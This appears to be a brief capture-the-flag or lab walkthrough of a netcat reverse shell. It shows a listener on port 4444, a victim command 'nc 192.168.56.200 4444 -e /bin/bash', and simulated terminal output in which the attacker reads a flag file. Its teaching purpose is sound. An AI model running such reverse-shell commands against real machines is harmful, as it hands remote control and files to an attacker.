Step 1: Attacker sets up listener with `nc -l -p 4444`  
Step 2: Victim connects back with `nc 192.168.56.200 4444 -e /bin/bash`  
Step 3: Reverse shell established - victim connects to attacker

```text
pentester@kali-linux:~$ Welcome to the Kali Terminal Simulation!
Type help to see available commands.
pentester@kali-linux:~$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Waiting for connection from victim...

(Use the victim terminal to run: nc 192.168.56.200 4444 -e /bin/bash)
victim@192.168.56.210:$ ls
Desktop  Documents  Downloads  Pictures  Videos  secret.txt
victim@192.168.56.210:$ cat secret.txt
FLAG{netcat_reverse_shell_success}
victim@192.168.56.210:$
```  

```text
Victim Machine (192.168.56.210)
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
victim@target:~$
victim@target:~$ nc 192.168.56.200 4444 -e /bin/bash
Connection established to 192.168.56.200:4444
victim@target:~$
```
